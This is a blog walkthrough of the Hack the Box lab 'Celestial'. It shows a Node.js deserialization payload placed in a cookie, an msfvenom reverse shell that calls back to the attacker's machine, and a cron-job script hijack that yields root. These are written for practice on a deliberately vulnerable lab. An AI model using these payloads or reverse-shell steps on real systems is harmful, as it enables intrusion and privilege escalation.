<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Box: Celestial Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-celestial-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-08-26T17:22:46+00:00">August 26, 2018</time><time class="updated" datetime="2025-07-05T15:45:41+00:00">July 5, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends!! Today we are going to solve another CTF challenge “<strong>Celestial</strong>” which is lab presented by <strong>Hack the Box</strong> and is available online for those who want to increase their skill in penetration testing and black box testing. Celestial is a retired vulnerable lab presented by Hack the Box for making online penetration practices according to your experience level; they have the collection of vulnerable labs as challenges, from beginners to Expert level.</span></p>
<p><span style="color: #000000;"><strong>Level: </strong>Intermediate</span></p>
<p><span style="color: #000000;"><strong>Task:</strong> find <strong>user.txt</strong> and <strong>root.txt</strong> file in the victim’s machine.</span></p>
<h3><span style="color: #800000;"><u>WalkThrough</u></span></h3>
<p><span style="color: #000000;">Since these labs are online available therefore they have static IP. The IP of Celestial is <strong>10.10.10.85</strong> </span></p>
<p><span style="color: #000000;">Let’s start off with scanning the network to find our target.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 10.10.10.85</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-Pf9vfLwS0oc/W4LfK-nqXAI/AAAAAAAAZ8M/4dn4mW-vbwMUdq4mRUP07dY5h_iPE01vgCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">The NMAP output shows us that the port TCP 3000 is opened on the target machine  Let’s try to access the website on a Non-standard HTTP port (3000) as follows :</span></p>
<p><span style="color: #000000;">Browse to http://10.10.10.85:3000 and we will be greeted with the following page</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-RgMSj4F93sc/W4LfMNYoe2I/AAAAAAAAZ8o/5kKQ-vQApm4Z0GOfXFF5MYlcNGRx6F7vQCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">As we didn’t find any other clue to move forward after navigating through many other possibilities; we quickly moved further to understand the website request via Burpsuite tool. Therefore, upon capturing the webpage’s GET request, we noticed the <strong>profile= </strong>Cookie parameter (highlighted in red)</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-lGvkjCdnrVM/W4LfMWPwRzI/AAAAAAAAZ8w/zW35RxJNKv412HrCSsG_a4jAnxHUuQJcACLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Copy the entire value inside the <strong>profile=</strong> cookie parameter and paste it in the Burpsuite decoder.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D</pre>
<p><span style="color: #000000;">On decoding the same we will get the output in base64 format. Once again, we will decode the base64 format output and would be able to see the results in a clear text format. The output displays the username and other details of a specific user This is an indication that we can insert our code in the cookie profile parameter value to get the desired results.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-J62FTW6GzSU/W4LfMufrDPI/AAAAAAAAZ80/6G8VuC4tGocHL9t4qH-k3YCRAZ8p88angCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">On further investigation, we came to know that this is a Node JS deserialization bug for the purpose of remote code execution. Further details of the same are mentioned in the below website. If we read the entire content of the website. We will observe that there is a function which contains a particular string comprising of multiple numeric values.</span></p>
<h5><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/">https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/</a></span></h5>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hxJuwP4iW0A/W4LfMmAO0sI/AAAAAAAAZ84/YJvVt8tQim8R41ze3IaVf9Qc9hVl5_KkQCLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Copy the entire numeric content (after <em>String.fromCharCode</em>) starting from 10 till 10 . Navigate to the URL https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html and convert Decimal to ASCII as shown in the screenshot below</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-LdkoMS6OTvw/W4LfM7FciwI/AAAAAAAAZ88/Q3zuTDw6mwA9lTgnYBu3iUyu1tt7JfzBwCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Now let’s change the contents of the ASCII text and replace the HOST and PORT parameter details with the HOST=10.10.14.3 and PORT= 4444, where 10.10.14.3 is our Kali machine IP. Once done, we will get the equivalent output in the Decimal format as shown below</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-dkFVHSxKExQ/W4LfNc4pLsI/AAAAAAAAZ9A/rWSYmldASn4yDDmkTU1ZXZ-0nnN17ajDACLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Copy the decimal output from the above screenshot starting from 118 and ending with 10, with each number, separated by a comma.</span></p>
<p><span style="color: #000000;"><strong>Note:</strong> As we can see, the above output separates the decimal output with a space. So we need to either do it manually or refer to the following Python script method to include the comma values before proceeding further.</span></p>
<h5><span style="color: #0000ff;"><a style="color: #0000ff;" href="&lt;yoastmark class=">https://github.com/Sayantan5/Holiday/blob/master/encode.py</a></span></h5>
<p><span style="color: #000000;">Once the decimal output (separated by comma) is ready. We need to now paste it inside the code shown below (replace the value with decimal output) and perform the Base64 encode of the same</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo {"username":"_$$ND_FUNC$$_function (){ eval(String.fromCharCode(value) )}()"} | base64 -w0</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-NzdhnXKTDiE/W4LfNu2spEI/AAAAAAAAZ9E/19n5ebKpXQQjAZq2i-mQ-hC2gQWXRAymwCLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Copy the encoded output above and paste it in front of the <strong>Profile=</strong> parameter of the Burpsuite as shown in the image below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-4-zgu8ynWns/W4LfLAh5DAI/AAAAAAAAZ8U/D7mWSGtOxmUO4Jz94sE8E-Rmtf2EqYxvgCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Once done we need to click on the Forward option, in Burpsuite Intercept tab</span></p>
<p><span style="color: #000000;"><strong>Note:</strong> Before forwarding the modified content in Burpsuite, we should set up the netcat listener in Kali machine and keep it ready.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 4444</pre>
<p><span style="color: #000000;">In order to access proper TTY shell, we had imported python one line script by typing following:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -c 'import pty;pty.spawn("/bin/bash")'</pre>
<p><span style="color: #000000;">Hurray !! We got into the reverse shell of the target machine</span></p>
<p><span style="color: #000000;">Let’s have a quick look at the contents</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ls</pre>
<p><span style="color: #000000;">We navigated to many folders, however, found interesting stuff in the Documents folder</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd Documents</pre>
<p><span style="color: #000000;">Here we can see that there is a user.txt file, lets read it contents</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat user.txt</pre>
<p><span style="color: #000000;">Finally, we got our first flag i.e  output of the user.txt file </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-zBzbnzfUZOk/W4LfLPWazuI/AAAAAAAAZ8Q/FPMdqAyWGlYNbrnaCISdTq6XnUkoaQPKACLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Now upon further navigation, we also opened the <strong>script.py</strong> file because of our curiosity to examine the contents of the same. If we do cat script.py, the output displays as <strong>print “Script is running”</strong></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat script.py</pre>
<h5><span style="color: #000000;">print “Script is running..”</span></h5>
<p><span style="color: #000000;"><strong>Note:</strong> This is an indication that we may need to examine the log files to see which script is running and if it is running on a periodic basis</span></p>
<p><span style="color: #000000;">The best step to move forward is to examine the contents of the log directory in var</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /var/log</pre>
<p><span style="color: #000000;">Let’s see the files listed over here</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ls</pre>
<p><span style="color: #000000;">We can see that this folder contains multiple generated syslog files. Then, we zip and number the old logs accordingly. We always store the latest logs in the log file named <strong>syslog</strong>. So, we will open the contents of the syslog file and try to find out if something interesting is going on.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat syslog</pre>
<p><span style="color: #000000;">We will notice that there is a cronjob running every 5 minutes, which is copying the output of script.py file (in the home/sun/Documents folder) to the output.txt file</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-d69h0nQ0YME/W4LfLWWwTxI/AAAAAAAAZ8Y/-g5BUAyAmvMQrWP4gmzFSKTNNzagmttogCLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Now we can try to put our own content in the script.py file. For this let’s generate a Reverse shell with the following command</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p cmd/unix/reverse_python lhost=10.10.14.3 lport=1234 R</pre>
<p><span style="color: #000000;">Copy the contents of msfvenom output and save it on Kali Desktop named as script.py, which will be further used in the subsequent steps</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-Bow4u9YRexE/W4LfLtm5GJI/AAAAAAAAZ8c/Xajr6W7kR-c-LJJ_-5QkKL7VGKC7g_k2QCLcBGAs/s1600/16.png"/></span></p>
<h5><span style="color: #000000;">Now run the web server on the Kali machine</span></h5>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m SimpleHTTPServer 80</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-opVZVGr-d6Y/W4LfL-EEWmI/AAAAAAAAZ8g/rSgVR-ps2d0mXXaYmG-k6Qc26vZVqcWTgCLcBGAs/s1600/18.png"/></span></p>
<p><span style="color: #000000;">Lets read the contents of the script.py.The output displays as print “Script is running..”</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat script.py</pre>
<p><span style="color: #000000;">Let’s move this original python script (<strong>script.py</strong>) by renaming it to <strong>script.py.original</strong> as shown below</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">mv script.py script.py.original</pre>
<p><span style="color: #000000;">Download our newly created script.py from the Kali machine Desktop</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget http://10.10.14.3/script.py</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://3.bp.blogspot.com/-xNAP-pDRjSs/W4LfMDKqdAI/AAAAAAAAZ8k/JxtxiSfpStoKduoj34du6z0QLYprjQmxQCLcBGAs/s1600/19.png"/></strong></span></p>
<p><span style="color: #000000;">Open a netcat reverse shell</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 1234</pre>
<p><span style="color: #000000;">In order to access proper TTY shell, we had imported python one line script by typing following:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -c 'import pty;pty.spawn("/bin/bash")'</pre>
<p><span style="color: #000000;">Hurray!! We got into the root</span></p>
<p><span style="color: #000000;">Navigate to the root directory</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /root</pre>
<p><span style="color: #000000;">Let’s see what content it has.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ls</pre>
<p><span style="color: #000000;">As we can see it contains 2 files root.txt and script.py. Lets open root.txt file</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat root.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-IYynBYHzhGs/W4LfMCCHW1I/AAAAAAAAZ8s/NL5LDNmmpx0bFFu9hrFk15JHAu11NBqpQCLcBGAs/s1600/20.png"/></span></p>
<p><span style="color: #000000;">Wonderful!! We have gained access to both user.txt and root.txt files and hacked this box.</span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author:</strong> Ankur Sachdev is an Information Security consultant and researcher in the field of Network &amp; WebApp Penetration Testing.<strong> Contact <a style="color: #000000;" href="https://www.linkedin.com/in/sachdevankur/">Here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
